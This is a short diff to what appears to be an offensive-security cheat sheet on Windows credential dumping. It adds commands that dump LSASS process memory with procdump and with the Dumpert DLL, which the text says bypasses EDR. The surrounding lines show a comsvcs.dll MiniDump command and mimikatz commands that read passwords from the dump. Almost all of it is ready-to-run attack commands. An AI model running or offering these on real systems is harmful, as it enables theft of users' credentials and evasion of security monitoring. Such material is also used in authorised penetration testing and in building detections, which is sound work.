@@ -9,6 +9,12 @@ sekurlsa::wdigest
 # Minidump - Extract LSASS process memory for passwords using rundll32
 rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\temp\lsass.dmp full
 
+# Minidump - Extract LSASS process memory for passwords using Sysinternals Procdump
+C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
+
+# Minidump - Extract LSASS process memory for passwords using direct system calls & API unhooking (bypass EDR) using Dumpert https://github.com/outflanknl/Dumpert
+rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump
+
 ## Load minidump in mimikatz & output passwords
 sekurlsa::minidump lsass.dmp
 mimikatz # sekurlsa::logonPasswords
